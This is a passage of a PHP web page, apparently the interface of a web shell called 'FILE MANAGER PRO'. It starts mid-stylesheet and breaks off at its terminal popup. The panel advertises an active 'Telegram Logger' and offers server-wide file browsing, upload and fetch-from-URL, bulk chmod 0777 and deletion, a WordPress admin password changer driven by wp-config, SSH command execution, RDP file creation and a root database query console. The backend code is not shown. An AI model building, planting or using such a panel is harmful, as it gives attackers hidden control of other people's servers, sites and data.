    /* Controls */
    .controls {
        display: flex;
        gap: 10px;
        align-items: center;
        flex-wrap: wrap;
    }
    
    .nav-search {
        display: flex;
        gap: 10px;
        background: rgba(255, 255, 255, 0.05);
        border-radius: 12px;
        padding: 8px;
        border: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .nav-search input {
        background: transparent;
        border: none;
        color: var(--text-primary);
        padding: 8px 15px;
        min-width: 300px;
        font-size: 14px;
    }
    
    .nav-search input:focus {
        outline: none;
    }
    
    .nav-search button {
        background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
        border: none;
        border-radius: 10px;
        color: white;
        padding: 8px 20px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s ease;
    }
    
    .nav-search button:hover {
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(0, 219, 222, 0.3);
    }
    
    /* Action Buttons */
    .action-buttons {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
    }
    
    .btn {
        padding: 10px 18px;
        border: none;
        border-radius: 12px;
        font-weight: 600;
        font-size: 13px;
        cursor: pointer;
        transition: all 0.3s ease;
        display: inline-flex;
        align-items: center;
        gap: 8px;
        text-decoration: none;
    }
    
    .btn-primary {
        background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
        color: white;
    }
    
    .btn-secondary {
        background: rgba(255, 255, 255, 0.1);
        color: var(--text-primary);
        border: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .btn-danger {
        background: linear-gradient(90deg, var(--danger), #dc2626);
        color: white;
    }
    
    .btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
    }
    
    .btn:active {
        transform: translateY(0);
    }
    
    /* Main Content */
    .main-content {
        display: grid;
        grid-template-columns: 1fr;
        gap: 25px;
    }
    
    /* File Manager Card */
    .file-manager-card {
        background: rgba(30, 41, 59, 0.8);
        backdrop-filter: blur(10px);
        border-radius: 20px;
        padding: 25px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
    }
    
    .card-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
        padding-bottom: 15px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .card-header h2 {
        font-size: 18px;
        font-weight: 700;
        color: var(--text-primary);
        display: flex;
        align-items: center;
        gap: 10px;
    }
    
    .stats {
        display: flex;
        gap: 15px;
        font-size: 13px;
        color: var(--text-secondary);
    }
    
    /* Quick Actions */
    .quick-actions {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 15px;
        margin-bottom: 25px;
    }
    
    .quick-action-form {
        display: flex;
        gap: 10px;
    }
    
    .quick-action-form input {
        flex: 1;
        padding: 12px 18px;
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 12px;
        color: var(--text-primary);
        font-size: 14px;
    }
    
    .quick-action-form input:focus {
        outline: none;
        border-color: var(--accent-primary);
    }
    
    .quick-action-form button {
        padding: 12px 25px;
        background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
        border: none;
        border-radius: 12px;
        color: white;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s ease;
    }
    
    .quick-action-form button:hover {
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(0, 219, 222, 0.3);
    }
    
    /* File Table */
    .table-container {
        overflow-x: auto;
        border-radius: 15px;
        background: rgba(15, 23, 42, 0.5);
        border: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    table {
        width: 100%;
        border-collapse: collapse;
        min-width: 800px;
    }
    
    thead {
        background: rgba(255, 255, 255, 0.05);
    }
    
    th {
        padding: 15px 20px;
        text-align: left;
        font-weight: 600;
        font-size: 13px;
        color: var(--text-secondary);
        text-transform: uppercase;
        letter-spacing: 1px;
        border-bottom: 2px solid rgba(255, 255, 255, 0.1);
    }
    
    td {
        padding: 15px 20px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        font-size: 14px;
    }
    
    tbody tr {
        transition: all 0.2s ease;
    }
    
    tbody tr:hover {
        background: rgba(255, 255, 255, 0.03);
    }
    
    /* Checkbox */
    .bulk-checkbox {
        width: 20px;
        height: 20px;
        cursor: pointer;
        accent-color: var(--accent-primary);
    }
    
    /* File Type Icons */
    .file-icon {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 36px;
        height: 36px;
        border-radius: 10px;
        margin-right: 10px;
        font-size: 18px;
    }
    
    .file-icon.folder {
        background: rgba(59, 130, 246, 0.2);
        color: #3b82f6;
    }
    
    .file-icon.file {
        background: rgba(16, 185, 129, 0.2);
        color: #10b981;
    }
    
    /* Action Buttons in Table */
    .action-cell {
        display: flex;
        gap: 8px;
    }
    
    .action-cell .btn {
        padding: 8px 15px;
        font-size: 12px;
    }
    
    /* Bulk Actions Bar */
    .bulk-actions-bar {
        background: linear-gradient(90deg, rgba(0, 219, 222, 0.1), rgba(252, 0, 255, 0.1));
        border: 1px solid rgba(0, 219, 222, 0.2);
        border-radius: 15px;
        padding: 15px 25px;
        margin-top: 20px;
        display: none;
        align-items: center;
        gap: 15px;
        flex-wrap: wrap;
    }
    
    .bulk-actions-bar.active {
        display: flex;
        animation: fadeIn 0.3s ease;
    }
    
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(-10px); }
        to { opacity: 1; transform: translateY(0); }
    }
    
    .bulk-title {
        font-weight: 700;
        color: var(--accent-primary);
        font-size: 14px;
    }
    
    .selected-count {
        margin-left: auto;
        font-weight: 700;
        color: var(--accent-primary);
        font-size: 14px;
    }
    
    /* Mobile Menu */
    .mobile-menu {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: rgba(30, 41, 59, 0.95);
        backdrop-filter: blur(20px);
        border-top: 1px solid rgba(255, 255, 255, 0.1);
        padding: 15px 20px;
        display: none;
        gap: 8px;
        flex-wrap: wrap;
        justify-content: center;
        z-index: 1000;
    }
    
    .mobile-menu .btn {
        padding: 10px 15px;
        font-size: 12px;
    }
    
    /* Popup Overlay */
    .popup-overlay {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.8);
        backdrop-filter: blur(10px);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 2000;
        padding: 20px;
        animation: fadeIn 0.3s ease;
    }
    
    .popup-content {
        background: linear-gradient(135deg, rgba(30, 41, 59, 0.95), rgba(15, 23, 42, 0.95));
        border-radius: 25px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
        width: 100%;
        max-width: 500px;
        max-height: 85vh;
        overflow: hidden;
        animation: slideUp 0.3s ease;
    }
    
    @keyframes slideUp {
        from { transform: translateY(50px); opacity: 0; }
        to { transform: translateY(0); opacity: 1; }
    }
    
    .popup-header {
        padding: 25px 30px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        display: flex;
        justify-content: space-between;
        align-items: center;
        background: rgba(255, 255, 255, 0.02);
    }
    
    .popup-header h3 {
        font-size: 18px;
        font-weight: 700;
        color: var(--text-primary);
        display: flex;
        align-items: center;
        gap: 10px;
    }
    
    .popup-close {
        width: 40px;
        height: 40px;
        border-radius: 12px;
        background: rgba(255, 255, 255, 0.1);
        border: none;
        color: var(--text-secondary);
        font-size: 20px;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        transition: all 0.3s ease;
    }
    
    .popup-close:hover {
        background: rgba(255, 255, 255, 0.2);
        color: var(--text-primary);
    }
    
    .popup-body {
        padding: 30px;
        overflow-y: auto;
        max-height: calc(85vh - 90px);
    }
    
    /* Feature Section */
    .feature-section {
        background: rgba(255, 255, 255, 0.03);
        border-radius: 15px;
        padding: 20px;
        margin-bottom: 20px;
        border: 1px solid rgba(255, 255, 255, 0.05);
    }
    
    .feature-section h4 {
        font-size: 16px;
        font-weight: 700;
        color: var(--accent-primary);
        margin-bottom: 15px;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    
    /* Form Elements */
    .form-group {
        margin-bottom: 15px;
    }
    
    .form-label {
        display: block;
        margin-bottom: 8px;
        font-size: 13px;
        color: var(--text-secondary);
        font-weight: 500;
    }
    
    .form-input {
        width: 100%;
        padding: 14px 18px;
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 12px;
        color: var(--text-primary);
        font-size: 14px;
        transition: all 0.3s ease;
    }
    
    .form-input:focus {
        outline: none;
        border-color: var(--accent-primary);
        background: rgba(255, 255, 255, 0.08);
        box-shadow: 0 0 0 3px rgba(0, 219, 222, 0.1);
    }
    
    .form-textarea {
        width: 100%;
        padding: 14px 18px;
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 12px;
        color: var(--text-primary);
        font-size: 14px;
        font-family: inherit;
        resize: vertical;
        min-height: 120px;
    }
    
    .form-select {
        width: 100%;
        padding: 14px 18px;
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 12px;
        color: var(--text-primary);
        font-size: 14px;
        cursor: pointer;
    }
    
    .form-btn {
        width: 100%;
        padding: 16px;
        background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
        border: none;
        border-radius: 12px;
        color: white;
        font-weight: 600;
        font-size: 15px;
        cursor: pointer;
        transition: all 0.3s ease;
        margin-top: 10px;
    }
    
    .form-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 10px 25px rgba(0, 219, 222, 0.3);
    }
    
    /* Feature Output */
    .feature-output {
        background: rgba(0, 0, 0, 0.3);
        border-radius: 12px;
        padding: 15px;
        margin-top: 20px;
        font-family: 'Cascadia Code', 'Monaco', monospace;
        font-size: 12px;
        color: var(--text-primary);
        border: 1px solid rgba(255, 255, 255, 0.1);
        max-height: 200px;
        overflow-y: auto;
        white-space: pre-wrap;
        word-break: break-all;
    }
    
    /* Responsive */
    @media (max-width: 1200px) {
        .container {
            padding: 15px;
        }
        .nav-search input {
            min-width: 200px;
        }
    }
    
    @media (max-width: 992px) {
        .header {
            flex-direction: column;
            align-items: stretch;
        }
        .controls {
            width: 100%;
        }
        .nav-search {
            width: 100%;
        }
        .nav-search input {
            min-width: 0;
            flex: 1;
        }
        .quick-actions {
            grid-template-columns: 1fr;
        }
    }
    
    @media (max-width: 768px) {
        .desktop-only {
            display: none !important;
        }
        .mobile-menu {
            display: flex;
        }
        .popup-content {
            max-width: 95%;
        }
        table {
            min-width: 600px;
        }
    }
    
    @media (max-width: 480px) {
        .container {
            padding: 10px;
        }
        .header, .file-manager-card {
            padding: 15px;
        }
        .popup-body {
            padding: 20px;
        }
        .btn {
            padding: 8px 12px;
            font-size: 12px;
        }
    }
    
    /* Animations */
    @keyframes pulse {
        0% { box-shadow: 0 0 0 0 rgba(0, 219, 222, 0.4); }
        70% { box-shadow: 0 0 0 10px rgba(0, 219, 222, 0); }
        100% { box-shadow: 0 0 0 0 rgba(0, 219, 222, 0); }
    }
    
    .pulse {
        animation: pulse 2s infinite;
    }
    
    /* Scrollbar */
    ::-webkit-scrollbar {
        width: 8px;
        height: 8px;
    }
    
    ::-webkit-scrollbar-track {
        background: rgba(255, 255, 255, 0.05);
        border-radius: 10px;
    }
    
    ::-webkit-scrollbar-thumb {
        background: linear-gradient(180deg, var(--accent-primary), var(--accent-secondary));
        border-radius: 10px;
    }
    
    ::-webkit-scrollbar-thumb:hover {
        background: linear-gradient(180deg, var(--accent-primary), #00c4cc);
    }
    
    /* Status Badges */
    .status-badge {
        display: inline-block;
        padding: 4px 10px;
        border-radius: 20px;
        font-size: 11px;
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 1px;
    }
    
    .status-success {
        background: rgba(16, 185, 129, 0.2);
        color: #10b981;
        border: 1px solid rgba(16, 185, 129, 0.3);
    }
    
    .status-warning {
        background: rgba(245, 158, 11, 0.2);
        color: #f59e0b;
        border: 1px solid rgba(245, 158, 11, 0.3);
    }
    
    .status-danger {
        background: rgba(239, 68, 68, 0.2);
        color: #ef4444;
        border: 1px solid rgba(239, 68, 68, 0.3);
    }
    
    /* Loading Spinner */
    .spinner {
        width: 40px;
        height: 40px;
        border: 3px solid rgba(255, 255, 255, 0.1);
        border-top: 3px solid var(--accent-primary);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 20px auto;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    /* Telegram Status */
    .telegram-status {
        position: fixed;
        top: 20px;
        left: 20px;
        background: rgba(59, 130, 246, 0.2);
        border: 1px solid rgba(59, 130, 246, 0.3);
        border-radius: 10px;
        padding: 8px 15px;
        font-size: 12px;
        color: #3b82f6;
        font-weight: 500;
        display: flex;
        align-items: center;
        gap: 8px;
        z-index: 9998;
        backdrop-filter: blur(10px);
    }
    </style>
    </head>
    <body>
    
    <?php if (isset($_SESSION['msg'])): ?>
    <div class="notification" id="notification">
        <?=esc($_SESSION['msg'])?>
    </div>
    <?php unset($_SESSION['msg']); ?>
    <?php endif; ?>
    
    <!-- Telegram Status -->
    <div class="telegram-status">
        <span>📡 Telegram Logger</span>
        <span class="status-badge status-success">Active</span>
    </div>
    
    <!-- Main Container -->
    <div class="container">
        
        <!-- Header -->
        <div class="header">
            <div class="brand">
                <div class="logo pulse">🌀</div>
                <div class="brand-info">
                    <h1>FILE MANAGER PRO</h1>
                    <div class="path">📂 <?=esc($dir)?></div>
                </div>
            </div>
            
            <div class="controls">
                <form method="GET" class="nav-search">
                    <input type="text" name="dir" placeholder="Enter directory path..." value="<?=esc($dir)?>">
                    <button type="submit" class="btn btn-primary">🔍 Go</button>
                </form>
                
                <div class="action-buttons desktop-only">
                    <a href="?dir=<?=urlencode($dir)?>&show_monitor=1" class="btn btn-secondary">📊 Monitor</a>
                    <a href="?dir=<?=urlencode($dir)?>&show_terminal=1" class="btn btn-secondary">💻 Terminal</a>
                    <a href="?dir=<?=urlencode($dir)?>&show_bulk=1" class="btn btn-secondary">🔧 Bulk Ops</a>
                    <a href="?dir=<?=urlencode($dir)?>&show_upload=1" class="btn btn-secondary">📤 Upload</a>
                    <a href="?dir=<?=urlencode($dir)?>&show_url_upload=1" class="btn btn-primary">🔗 URL</a>
                    <a href="?dir=<?=urlencode($dir)?>&show_wp_changer=1" class="btn btn-primary">🔑 WP</a>
                    <a href="?dir=<?=urlencode($dir)?>&show_ssh=1" class="btn btn-primary">🔐 SSH</a>
                    <a href="?dir=<?=urlencode($dir)?>&show_rdp=1" class="btn btn-primary">🖥️ RDP</a>
                    <a href="?dir=<?=urlencode($dir)?>&show_database=1" class="btn btn-primary">🗄️ DB</a>
                    <a href="?logout=1" class="btn btn-danger">🚪 Logout</a>
                </div>
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="main-content">
            
            <!-- File Manager Card -->
            <div class="file-manager-card">
                <div class="card-header">
                    <h2>📁 File Explorer</h2>
                    <div class="stats">
                        <span>📊 Items: <?=count($files)-2?></span>
                        <span>🕐 <?=date('H:i:s')?></span>
                    </div>
                </div>
                
                <!-- Quick Actions -->
                <div class="quick-actions">
                    <form method="POST" class="quick-action-form">
                        <input type="text" name="new_folder" placeholder="New folder name..." required>
                        <button type="submit">📁 Create</button>
                    </form>
                    <form method="POST" class="quick-action-form">
                        <input type="text" name="new_file" placeholder="New file name..." required>
                        <button type="submit">📄 Create</button>
                    </form>
                </div>
                
                <!-- File Table -->
                <div class="table-container">
                    <form id="bulkForm" method="POST">
                        <table>
                            <thead>
                                <tr>
                                    <th style="width: 50px;">
                                        <input type="checkbox" id="selectAll" class="bulk-checkbox">
                                    </th>
                                    <th>Name</th>
                                    <th>Type</th>
                                    <th>Size</th>
                                    <th>Modified</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if ($dir != '/' && $dir != '' && $parent != $dir): ?>
                                <tr>
                                    <td></td>
                                    <td>
                                        <div style="display: flex; align-items: center;">
                                            <div class="file-icon folder">📁</div>
                                            <div>
                                                <div style="font-weight: 600; color: var(--accent-primary);">..</div>
                                                <div style="font-size: 11px; color: var(--text-secondary);">Parent directory</div>
                                            </div>
                                        </div>
                                    </td>
                                    <td><span class="status-badge status-warning">Parent</span></td>
                                    <td>-</td>
                                    <td>-</td>
                                    <td class="action-cell">
                                        <a href="?dir=<?=urlencode($parent)?>" class="btn btn-secondary">Open</a>
                                    </td>
                                </tr>
                                <?php endif; ?>
                                
                                <?php foreach ($files as $f): ?>
                                    <?php if ($f == '.' || $f == '..') continue; ?>
                                    <?php
                                    $p = $dir . '/' . $f;
                                    $is_dir = is_dir($p);
                                    $size = !$is_dir ? @filesize($p) : 0;
                                    $modified = @filemtime($p);
                                    $perms = @fileperms($p);
                                    ?>
                                    <tr>
                                        <td>
                                            <input type="checkbox" class="bulk-checkbox" name="bulk_selected[]" value="<?=esc($f)?>">
                                        </td>
                                        <td>
                                            <div style="display: flex; align-items: center;">
                                                <div class="file-icon <?=$is_dir?'folder':'file'?>">
                                                    <?=$is_dir?'📁':'📄'?>
                                                </div>
                                                <div>
                                                    <div style="font-weight: 600;"><?=esc($f)?></div>
                                                    <div style="font-size: 11px; color: var(--text-secondary);">
                                                        Perms: <?=substr(sprintf('%o', $perms), -4)?>
                                                    </div>
                                                </div>
                                            </div>
                                        </td>
                                        <td>
                                            <span class="status-badge <?=$is_dir?'status-warning':'status-success'?>">
                                                <?=$is_dir?'Folder':'File'?>
                                            </span>
                                        </td>
                                        <td><?=!$is_dir?hfs($size):'-'?></td>
                                        <td><?=$modified?date('Y-m-d H:i', $modified):'-'?></td>
                                        <td class="action-cell">
                                            <?php if ($is_dir): ?>
                                                <a href="?dir=<?=urlencode($p)?>" class="btn btn-secondary">Open</a>
                                                <form method="POST" style="display: inline;">
                                                    <input type="hidden" name="del_file" value="<?=esc($p)?>">
                                                    <button type="submit" class="btn btn-danger" onclick="return confirm('Delete folder <?=esc($f)?>?')">Delete</button>
                                                </form>
                                            <?php else: ?>
                                                <a href="<?=esc($p)?>" download class="btn btn-secondary">Download</a>
                                                <form method="POST" style="display: inline;">
                                                    <input type="hidden" name="edit_file" value="<?=esc($p)?>">
                                                    <button type="submit" class="btn btn-primary">Edit</button>
                                                </form>
                                                <form method="POST" style="display: inline;">
                                                    <input type="hidden" name="del_file" value="<?=esc($p)?>">
                                                    <button type="submit" class="btn btn-danger" onclick="return confirm('Delete file <?=esc($f)?>?')">Delete</button>
                                                </form>
                                            <?php endif; ?>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                                
                                <?php if (count($files) <= 2): ?>
                                    <tr>
                                        <td colspan="6" style="text-align: center; padding: 40px; color: var(--text-secondary);">
                                            <div style="font-size: 48px; margin-bottom: 20px;">📂</div>
                                            <div style="font-size: 16px; font-weight: 600; margin-bottom: 10px;">Folder is empty</div>
                                            <div style="font-size: 14px;">Upload files or create new ones</div>
                                        </td>
                                    </tr>
                                <?php endif; ?>
                            </tbody>
                        </table>
                        
                        <!-- Bulk Actions Bar -->
                        <div id="bulkActionsBar" class="bulk-actions-bar">
                            <span class="bulk-title">🔧 Selected Items:</span>
                            <button type="button" class="btn btn-danger" onclick="setBulkAction('delete')">🗑️ Delete</button>
                            <button type="button" class="btn btn-primary" onclick="setBulkAction('zip')">📦 ZIP</button>
                            <button type="button" class="btn btn-primary" onclick="setBulkAction('unzip')">📂 UnZIP</button>
                            <button type="button" class="btn btn-secondary" onclick="setBulkAction('copy')">📋 Copy</button>
                            <button type="button" class="btn btn-secondary" onclick="setBulkAction('move')">🚚 Move</button>
                            <button type="button" class="btn btn-secondary" onclick="setBulkAction('chmod')">🔒 Chmod</button>
                            <button type="button" class="btn btn-secondary" onclick="setBulkAction('rename')">✏️ Rename</button>
                            <button type="button" class="btn btn-secondary" onclick="setBulkAction('export_list')">📊 Export</button>
                            <span id="selectedCount" class="selected-count">0 selected</span>
                        </div>
                        
                        <!-- Hidden Fields for Bulk Operations -->
                        <input type="hidden" id="bulkAction" name="bulk_action" value="">
                        <input type="hidden" id="zipName" name="zip_name" value="archive_<?=date('Ymd_His')?>.zip">
                        <input type="hidden" id="bulkTarget" name="bulk_target" value="<?=esc($dir)?>">
                        <input type="hidden" id="chmodMode" name="chmod_mode" value="0644">
                        <input type="hidden" id="renamePattern" name="rename_pattern" value="">
                        <input type="hidden" id="renameType" name="rename_type" value="">
                        <input type="hidden" id="renameSearch" name="rename_search" value="">
                        <input type="hidden" id="renameReplace" name="rename_replace" value="">
                    </form>
                </div>
            </div>
            
        </div>
    </div>
    
    <!-- Mobile Menu -->
    <div class="mobile-menu">
        <a href="?dir=<?=urlencode($dir)?>&show_monitor=1" class="btn btn-secondary">📊</a>
        <a href="?dir=<?=urlencode($dir)?>&show_terminal=1" class="btn btn-secondary">💻</a>
        <a href="?dir=<?=urlencode($dir)?>&show_bulk=1" class="btn btn-secondary">🔧</a>
        <a href="?dir=<?=urlencode($dir)?>&show_upload=1" class="btn btn-secondary">📤</a>
        <a href="?dir=<?=urlencode($dir)?>&show_url_upload=1" class="btn btn-primary">🔗</a>
        <a href="?dir=<?=urlencode($dir)?>&show_wp_changer=1" class="btn btn-primary">🔑</a>
        <a href="?dir=<?=urlencode($dir)?>&show_ssh=1" class="btn btn-primary">🔐</a>
        <a href="?dir=<?=urlencode($dir)?>&show_rdp=1" class="btn btn-primary">🖥️</a>
        <a href="?dir=<?=urlencode($dir)?>&show_database=1" class="btn btn-primary">🗄️</a>
        <a href="?logout=1" class="btn btn-danger">🚪</a>
    </div>
    
    <!-- ==================== POPUP WINDOWS ==================== -->
    
    <!-- Bulk Operations Popup -->
    <?php if ($show_bulk): ?>
    <div class="popup-overlay">
        <div class="popup-content" style="max-width: 600px;">
            <div class="popup-header">
                <h3>🔧 Bulk Operations</h3>
                <button class="popup-close" onclick="window.location.href='?dir=<?=urlencode($dir)?>'">×</button>
            </div>
            <div class="popup-body">
                <div class="feature-section">
                    <h4>📦 ZIP Operations</h4>
                    <div class="form-group">
                        <input type="text" id="bulkZipName" class="form-input" placeholder="archive.zip" value="archive_<?=date('Ymd_His')?>.zip">
                    </div>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                        <button type="button" class="form-btn" onclick="executeBulk('zip')">Create ZIP</button>
                        <button type="button" class="form-btn" onclick="executeBulk('unzip')">Extract ZIPs</button>
                    </div>
                </div>
                
                <div class="feature-section">
                    <h4>📋 Copy/Move Files</h4>
                    <div class="form-group">
                        <input type="text" id="bulkTargetDir" class="form-input" placeholder="Target directory" value="<?=esc($dir)?>">
                    </div>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                        <button type="button" class="btn btn-secondary" onclick="executeBulk('copy')">Copy</button>
                        <button type="button" class="btn btn-secondary" onclick="executeBulk('move')">Move</button>
                    </div>
                </div>
                
                <div class="feature-section">
                    <h4>🔒 Change Permissions</h4>
                    <div class="form-group">
                        <select id="bulkChmod" class="form-select">
                            <option value="0644">0644 - Files (rw-r--r--)</option>
                            <option value="0755">0755 - Folders (rwxr-xr-x)</option>
                            <option value="0777">0777 - Full Access</option>
                        </select>
                    </div>
                    <button type="button" class="form-btn" onclick="executeBulk('chmod')">Change Permissions</button>
                </div>
                
                <div class="feature-section">
                    <h4>🗑️ Delete Files</h4>
                    <button type="button" class="btn btn-danger" onclick="executeBulk('delete')" style="width: 100%;">Delete Selected Items</button>
                </div>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- SSH Manager Popup -->
    <?php if ($show_ssh): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h3>🔐 SSH Manager</h3>
                <button class="popup-close" onclick="window.location.href='?dir=<?=urlencode($dir)?>'">×</button>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="feature-section">
                        <h4>SSH Connection</h4>
                        <div class="form-group">
                            <input type="text" name="ssh_host" class="form-input" placeholder="Host/IP" required>
                        </div>
                        <div class="form-group">
                            <input type="number" name="ssh_port" class="form-input" placeholder="Port" value="22">
                        </div>
                        <div class="form-group">
                            <input type="text" name="ssh_user" class="form-input" placeholder="Username" required>
                        </div>
                        <div class="form-group">
                            <input type="password" name="ssh_pass" class="form-input" placeholder="Password" required>
                        </div>
                        <div class="form-group">
                            <input type="text" name="ssh_command" class="form-input" placeholder="Command" value="ls -la" required>
                        </div>
                        <button type="submit" class="form-btn">Execute SSH Command</button>
                    </div>
                </form>
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output"><?=esc($feature_result)?></div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- WordPress Password Changer Popup -->
    <?php if ($show_wp_changer): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h3>🔑 WordPress Password Changer</h3>
                <button class="popup-close" onclick="window.location.href='?dir=<?=urlencode($dir)?>'">×</button>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="feature-section">
                        <h4>Change WordPress Password</h4>
                        <div class="form-group">
                            <input type="text" name="wp_path" class="form-input" placeholder="/path/to/wp-config.php" required>
                        </div>
                        <div class="form-group">
                            <input type="text" name="wp_user" class="form-input" placeholder="Username" value="admin" required>
                        </div>
                        <div class="form-group">
                            <input type="text" name="wp_pass" class="form-input" value="<?=generatePassword()?>" required>
                        </div>
                        <input type="hidden" name="wp_action" value="change">
                        <button type="submit" class="form-btn">Change Password</button>
                    </div>
                </form>
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output"><?=esc($feature_result)?></div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Database Manager Popup -->
    <?php if ($show_database): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h3>🗄️ Database Manager</h3>
                <button class="popup-close" onclick="window.location.href='?dir=<?=urlencode($dir)?>'">×</button>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="feature-section">
                        <h4>Database Connection</h4>
                        <div class="form-group">
                            <input type="text" name="db_host" class="form-input" value="localhost">
                        </div>
                        <div class="form-group">
                            <input type="text" name="db_user" class="form-input" value="root">
                        </div>
                        <div class="form-group">
                            <input type="password" name="db_pass" class="form-input" placeholder="Password">
                        </div>
                    </div>
                    
                    <div class="feature-section">
                        <h4>List Databases</h4>
                        <input type="hidden" name="db_action" value="list">
                        <button type="submit" class="form-btn">List All Databases</button>
                    </div>
                    
                    <div class="feature-section">
                        <h4>Execute SQL Query</h4>
                        <div class="form-group">
                            <input type="text" name="db_name" class="form-input" placeholder="Database name">
                        </div>
                        <div class="form-group">
                            <textarea name="db_sql" class="form-textarea" placeholder="SQL Query">SHOW TABLES</textarea>
                        </div>
                        <input type="hidden" name="db_action" value="query">
                        <button type="submit" class="form-btn">Execute Query</button>
                    </div>
                </form>
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output"><?=esc($feature_result)?></div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- RDP Creator Popup -->
    <?php if ($show_rdp): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h3>🖥️ RDP Creator</h3>
                <button class="popup-close" onclick="window.location.href='?dir=<?=urlencode($dir)?>'">×</button>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="feature-section">
                        <h4>Create RDP File</h4>
                        <div class="form-group">
                            <input type="text" name="rdp_host" class="form-input" placeholder="Host/IP" required>
                        </div>
                        <div class="form-group">
                            <input type="text" name="rdp_user" class="form-input" placeholder="Username" required>
                        </div>
                        <div class="form-group">
                            <input type="text" name="rdp_domain" class="form-input" placeholder="Domain (optional)">
                        </div>
                        <div class="form-group">
                            <input type="text" name="rdp_filename" class="form-input" placeholder="Filename" value="connection.rdp">
                        </div>
                        <input type="hidden" name="rdp_action" value="create">
                        <button type="submit" class="form-btn">Create RDP File</button>
                    </div>
                </form>
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output"><?=esc($feature_result)?></div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- URL Upload Popup -->
    <?php if ($show_url_upload): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h3>🔗 URL Upload</h3>
                <button class="popup-close" onclick="window.location.href='?dir=<?=urlencode($dir)?>'">×</button>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="feature-section">
                        <h4>Download from URL</h4>
                        <div class="form-group">
                            <input type="text" name="url_up_custom" class="form-input" placeholder="https://example.com/file.zip" required>
                        </div>
                        <div class="form-group">
                            <input type="text" name="url_fn_custom" class="form-input" placeholder="Custom filename (optional)">
                        </div>
                        <button type="submit" class="form-btn">Download</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Upload Popup -->
    <?php if ($show_upload): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h3>📤 File Upload</h3>
                <button class="popup-close" onclick="window.location.href='?dir=<?=urlencode($dir)?>'">×</button>
            </div>
            <div class="popup-body">
                <form method="POST" enctype="multipart/form-data">
                    <div class="feature-section">
                        <h4>Upload Files</h4>
                        <div class="form-group">
                            <input type="file" name="upload[]" class="form-input" multiple required>
                        </div>
                        <button type="submit" class="form-btn">Upload Files</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Terminal Popup -->
    <?php if ($show_terminal): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h3>💻 Terminal</h3>
